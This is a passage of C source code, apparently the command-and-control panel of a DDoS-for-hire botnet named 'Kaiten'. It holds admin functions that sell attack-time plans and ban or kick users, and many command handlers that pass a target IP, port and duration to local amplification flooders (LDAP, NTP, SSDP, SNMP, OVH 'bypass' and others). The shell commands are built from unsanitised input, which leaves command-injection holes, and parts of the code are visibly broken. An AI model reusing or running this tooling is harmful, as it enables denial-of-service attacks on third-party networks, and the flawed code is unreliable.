						if(strstr(buf, "CUTIE") || strstr(buf, "cutie") || strstr(buf, "Cutie"));
						{
							strcpy(maxtime1, "300");
							strcpy(cooldown1, "100");
							strcpy(status1, "Cutie");
						}
			
						if(strstr(buf, "NORMAL") || strstr(buf, "normal") || strstr(buf, "Normal"));
						{
							strcpy(maxtime1, "600");
							strcpy(cooldown1, "100");
							strcpy(status1, "Normal");
						}
			
						if(strstr(buf, "VIP") || strstr(buf, "Vip") || strstr(buf, "vip"))
						{
							strcpy(maxtime1, "1300");
							strcpy(cooldown1, "80");
							strcpy(status1, "Vip");
						}

						if(strstr(buf, "PRO") || strstr(buf, "Pro") || strstr(buf, "pro"))
						{
							strcpy(maxtime1, "2100");
							strcpy(cooldown1, "60");
							strcpy(status1, "Pro");
						}
						
						if(strstr(buf, "GODLY") || strstr(buf, "Godly") || strstr(buf, "godly"))
						{
							strcpy(maxtime1, "3600");
							strcpy(cooldown1, "85");
							strcpy(status1, "GODLY");				
						}				
						sprintf(usethis, "\e[1;36mUsage: DD/MM/YY\r\nExpiry:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0,sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(newexpiry, buf);
						thing:
						sprintf(cmd1, "%s %s %s %s %s %s", username1, password1, status1, maxtime1, cooldown1, newexpiry);
						sprintf(send1, "echo '%s' >> kaiten.txt", cmd1);
						system(send1);
						sprintf(usethis, "\e[1;37mAccount [%s] Added\r\n", username1);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Added User: [%s] Plan: [%s]\n", managements[datafd].id, username1, status1);
			
					}
					else if(strstr(buf, "2") || strstr(buf, "TWO") || strstr(buf, "Two") || strstr(buf, "two"))
					{
						char removeuser[80];
						char sys[800];
						sprintf(usethis, "Usename:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(removeuser, buf);
						sprintf(sys,"sed '/\\<%s\\>/d' -i kaiten.txt", removeuser);
						system(sys);
						sprintf(usethis, "\e[1;37mAccount [%s] Has Been Removed\r\n", removeuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Removed User: [%s]\n", managements[datafd].id, removeuser);
					}
					else if(strstr(buf, "3") || strstr(buf, "THREE") || strstr(buf, "Three") || strstr(buf, "three"))
					{
						char banuser[80];
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(banuser, buf);
						sprintf(send1, "echo '%s' >> logs/BANNEDUSERS.txt", banuser);
						system(send1);
						sprintf(usethis, "\e[1;35m Account \e[1;37m[%s] \e[1;35mHas Been Banned\r\n", banuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Banned User: [%s]\n", managements[datafd].id, banuser);
					}
					else if(strstr(buf, "4") || strstr(buf, "FOUR") || strstr(buf, "Four") || strstr(buf, "four"))
					{
						char sys[800];
						char unbanuser[80] ;
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(unbanuser, buf);
						sprintf(sys,"sed '/\\<%s\\>/d' -i logs/BANNEDUSERS.txt", unbanuser);
						system(sys);
						sprintf(usethis, "\e[1;35mAccount \e[1;37m[%s] \e[1;35mHas Been UnBanned\r\n", unbanuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s UnBanned User: [%s]\n", managements[datafd].id, unbanuser);
					}
					else if(strstr(buf, "5") || strstr(buf, "FIVE") || strstr(buf, "Five") || strstr(buf, "five"))
					{
						char ipbanuser[80];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(ipbanuser, buf);
						sprintf(send1, "echo '%s' >> logs/IPBANNED.txt",ipbanuser);
						system(send1);
						sprintf(usethis, "\e[1;35m[%s] \e[1;36mHas Been IP Banned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s IP Banned: [%s]\r\n", managements[datafd].id, ipbanuser);
					}
					else if(strstr(buf, "6") || strstr(buf, "SIX") || strstr(buf, "Six") || strstr(buf, "six"))
					{
						char sys[800];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						sprintf(sys, "sed '/\\<%s\\>/d' -i logs/IPBANNED.txt", buf);
						system(sys);
						sprintf(usethis, "\e[1;35m[%s] \e[1;36mHas Been UnIPBanned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s UnIPBanned: [%s]\n", managements[datafd].id, buf);
					}
			
					else if(strcasestr(buf, "7") || strcasestr(buf, "seven"))
					{	
						int fail;
						char usertokick[800];
						sprintf(usethis, "Users Online\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						int kickonline;
						for(kickonline=0;kickonline < MAXFDS;kickonline++)
						{
							if(strlen(managements[kickonline].id) > 1 && managements[kickonline].connected == 1)
							{
								char kickonlineusers[800];
								sprintf(kickonlineusers, "| %s |\r\n", managements[kickonline].id);
								if(send(datafd, kickonlineusers, strlen(kickonlineusers), MSG_NOSIGNAL) == -1) goto end;
							}
						}
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(usertokick, buf);
			
						for(kickonline=0;kickonline<MAXFDS;kickonline++)
						{
							if(!strcmp(managements[kickonline].id, usertokick))
							{
								sprintf(usethis, "\r\n\e[1;31m You Have Been Kicked Out Of The Net!\r\n");
								if(send(kickonline, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								sent = 1;
								sleep(1);
								memset(managements[kickonline].id,0, sizeof(managements[kickonline].id));
								OperatorsConnected--;
								managements[kickonline].connected = 0;
								close(kickonline);
							}
						}
						if(sent != NULL)
						{
							sprintf(usethis,"\e[1;31mUser %s Has Been Kicked\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
							printf("[Kaiten]:%s Kicked User: [%s]\r\n", managements[datafd].id, usertokick);
						}
			
						else if(!sent)
						{
							sprintf(usethis, "\e[1;35mUser %s Is Not Online.\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						}
					}
			
					else if(strstr(buf, "8"))
					{
						char Blacklistip[80];
						sprintf(usethis, "IP:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(Blacklistip, buf);
						sprintf(send1, "echo '%s' >> logs/Blacklist.txt",Blacklistip);
						system(send1);
						sprintf(usethis, "\e[1;35m[%s] \e[1;36mHas Been Blacklisted\r\n", Blacklistip);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Blacklisted IP: [%s]\r\n", managements[datafd].id, Blacklistip);
					}
					else if(strstr(buf, "cls"));
					{
						//nun
					}
				} else {
			 		char noperms[800];
			 		sprintf(noperms, "\e[1;31m You Do Not Have Admin Perms\r\n");
			 		if(send(datafd, noperms, strlen(noperms), MSG_NOSIGNAL) == -1) goto end;
				}
			}

        	if(strcasestr(buf, "motd"))
 			{
				if(managements[datafd].adminstatus == 1)
        	    {
        	   		char sendbuf[50]; 
 					memset(buf, 0, sizeof(buf));
 					sprintf(sendbuf, "\e[1;37mMOTD: "); 
 					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 					fdgets(buf, sizeof(buf), datafd);
 					trim(buf);
 					if(strlen(buf) < 80)
 					{
 							motdaction = 1;
 							strcpy(motd, buf);
 							sprintf(usethis, "\e[1;37mMOTD Has Been Updated\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							// printf("[Kaiten]:An Admin Set The Motd To: %s \n", motd);
 					}
				}
				else
				{
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[1;37m You Do \e[1;31mNOT\e[1;37m Have Admin Perms\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
				}
				
 			}


 			else if(strcasestr(buf, "broadcast"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					int brdcstthing;
 					int userssentto = 0;
 					int msgoff = 0;
 					sprintf(usethis, "MSG:");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					memset(buf, 0, sizeof(buf));
 					if(fdgets(buf, sizeof(buf), datafd) > 1) goto end;
 					trim(buf);
 					strcpy(broadcastmsg, buf);
 					memset(buf,0,sizeof(buf));
 						if(strlen(broadcastmsg) < 80)
 						{
 							if(OperatorsConnected > 1)
 							{
 								for(brdcstthing=0;brdcstthing<MAXFDS;brdcstthing++)
 								{
 									if(managements[brdcstthing].connected == 1 && strcmp(managements[brdcstthing].id, managements[datafd].id) != 0)
 									{
 										if(managements[brdcstthing].broadcasttoggle == 0)
 										{
 											sprintf(usethis, "\r\n\e[1;31m[Broadcasted Message From]: %s\r\n\e[1;37mMessage: %s\r\n", managements[datafd].id, broadcastmsg);
 											if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		
 											sprintf(usethis, "\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[brdcstthing].id);
 											if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 											sent = 1;
 											userssentto++;
 										} else {
 											msgoff++;
 										}
 									} else {
 										//nun
 									}
 								}
 							} else {
 								sprintf(usethis, "\e[1;31mThere Are No Users Online\r\n");
 								if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							}
 						} else {
 							sprintf(usethis, "\e[1;36mBroadcasted Message Cannot Be Over 80 Characters\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						}
	
 						if(sent == 1)
 						{
		
 							sprintf(usethis, "\e[1;36mMessage Broadcasted To \e[1;37m%d \e[1;36mUsers | \e[1;37m%d \e[1;36mUsers Have Broadcast Toggled Off\r\n", userssentto, msgoff);
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							sent = 0;
 							printf("[Kaiten]:%s Sent A Broadcast Message: %s", managements[datafd].id, broadcastmsg, userssentto, broadcastmsg);
 							userssentto = 0;
 							msgoff = 0;
 						}
	
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 		 				
 				}
 			}

 			if(strcasestr(buf, "ToggleListen"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].listenattacks == 0)
 					{
 						managements[datafd].listenattacks = 1;
 						sprintf(usethis, "\e[1;36mAttack Listen Has Been Turned \e[1;32mON\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Kaiten]:%s Is Listening To Attacks\n", managements[datafd].id);
 					}
 					else if(managements[datafd].listenattacks == 1)
 					{
 						managements[datafd].listenattacks = 0;
 						sprintf(usethis, "\e[1;36mAttack Listen Has Been Turned \e[1;31mOFF\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Kaiten]:%s Is No Longer Listening To Attacks\n", managements[datafd].id);
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 				
 				}
 			}

 			else if(strcasestr(buf, "ToggleAttacks"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(AttackStatus == 0)
 					{
        	        			sprintf(usethis, "\e[1;36mAttacks Have Been Turned \e[1;31mOFF\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Kaiten]:%s Has Toggled OFF Attacks\n", managements[datafd].id);
        	        			AttackStatus = 1;
 					} else {
        	        			sprintf(usethis, "\e[1;36mAttacks Have Been Turned \e[1;32mON\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Kaiten]:%s Has Toggled ON Attacks\n", managements[datafd].id);
        	        			AttackStatus = 0; 					
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[1;31m You Do Not Have Admin Perms\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	 				
 				}
 			}

 			else if(strcasestr(buf, "ToggleLogin"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].LoginListen == 1)
 					{
 						sprintf(usethis, "\e[1;36mYou Have \e[1;31mStopped \e[1;36mListening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Kaiten]:%s Stopped Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 0;
 					} else {
 						sprintf(usethis, "\e[1;36mYou Have \e[1;32mStarted \e[1;36mListening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Kaiten]:%s Started Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 1; 				
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[1;31mYou Do Not Have Admin Perms\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	
 				}
 			}


///////////////////////////////////////////////////////////////////////////////////////////////START OF IPHM COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF IPHM COMMANDS////////////////////////////////////////////////////////////////////////////
        if (strstr(buf, "!* LDAP")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " ");

        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 

        char ipport[5000];
        char *token2 = strtok(buf, " "); 

        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);

        char iptime[5000];
        char *token3 = strtok(buf, " ");

        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);

        char *ipkill[5000]; 
        trim(ipkill); 
        snprintf(ipkill, "./ldap %s %s ldap.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 

        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:LDAP-[File: ldap.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".NTP")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./ntp %s %s ntp.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:NTP-[File: ntp.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".TFTP")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./tftp %s %s tftp.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:TFTP-[File: tftp.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".SSDP")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./ssdp %s %s ssdp.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:SSDP-[File: ssdp.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".SNMP")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./snmp %s %s snmp.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:SNMP-[File: snmp.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".CHARGEN")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./chargen %s %s chargen.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:chargen-[File: chargen.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".NETBIOS")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./netbios %s %s netbios.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:NETBIOS-[File: netbios.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".MSSQL")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./mssql %s %s mssql.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:MSSQL-[File: mssql.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".SENTINEL")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./sentinel %s %s sentinel.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:SENTINEL-[File: sentinel.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".T-MOBILE")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./Tmobile %s %s tmobile.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:TMobile-[File: tmobile.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".VOX-BYPASS"))
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./vox %s 2 -1 %s", iptarget, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:VOX-[File: NO FILE NEEDED]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".OVH-KTN")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./ovh %s %s ovh.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:OVH-KTN-[File: ovh.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".HIPER-OVH")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./HiperOVH %s %s", iptarget, ipport); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:HiperOVH-[File: NO FILE NEEDED]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".WSD")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./more/wsd %s %s wsd.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:WSD-[File: wsd.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".O-VPN")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./more/openvpn %s %s openvpn.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:OPENVPN-[File: openvpn.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".IPSEC")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget); 
        char ipport[5000];
        char *token2 = strtok(buf, " "); 
        sprintf(ipport, sizeof(ipport), "%s", token2+strlen(token2)+1);
        trim(ipport);
        char iptime[5000];
        char *token3 = strtok(buf, " ");
        sprintf(iptime, sizeof(iptime), "%s", token3+strlen(token3)+1);
        trim(iptime);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./more/ipsec %s %s ipsec.txt 2 -1 %s", iptarget, ipport, iptime); 
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:IPSEC-[File: ipsec.txt]\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }

        if (strstr(buf, ".DVR")) // System Command Function
         {
        char iptarget[5000]; 
        char *token = strtok(buf, " "); 
        sprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); 
        trim(iptarget);
        char *ipkill[5000]; 
        trim(ipkill); 
        sprintf(ipkill, "./more/dvr %s 443 dvr.txt 2 -1 60", iptarget);
        system(ipkill); 
        sprintf(botnet, " \e[1;36m Attack Sent! \e[1;33-\e[1;37m [Method]:DVR-[File: dvr.txt]\r\n");
